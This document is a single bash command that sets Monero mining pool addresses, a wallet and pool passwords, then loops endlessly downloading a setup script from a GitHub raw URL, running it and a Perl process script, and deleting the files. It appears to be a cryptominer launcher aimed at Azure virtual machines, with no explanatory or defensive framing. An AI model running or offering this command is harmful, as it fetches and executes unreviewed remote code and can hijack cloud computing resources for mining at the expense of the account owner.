/bin/bash -c \"export pool_pass1=RUN:azure;export pool_address1=pool.supportxmr.com:5555;export wallet1=41zBXk5aQs3b6QjEhWBSc6PMHZjEyK42MD9NSkvqYpiTPmw739QX417BPMoF1e8qMMiyWM1UGa7giEFhuYvmhreg3pqsaLF;export nicehash1=true;export pool_pass2=SAFE:azure;export pool_address2=pool-ca.supportxmr.com:5555;export wallet2=41zBXk5aQs3b6QjEhWBSc6PMHZjEyK42MD9NSkvqYpiTPmw739QX417BPMoF1e8qMMiyWM1UGa7giEFhuYvmhreg3pqsaLF;export nicehash2=true;while [ 1 ] ;do wget https://raw.githubusercontent.com/jb12mbh2/xmr_azure/master/setup_vm5.sh; chmod u+x setup_vm5.sh ; ./setup_vm5.sh ; cd xmr_azure; cd scripts; chmod u+x run_process.pl; ./run_process.pl 30; cd ..; cd ..; rm -rf xmr_azure ; rm -rf setup_vm5.sh; done;
